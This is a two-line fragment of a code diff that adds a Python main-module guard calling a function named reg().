+if __name__ == '__main__':
+    reg()
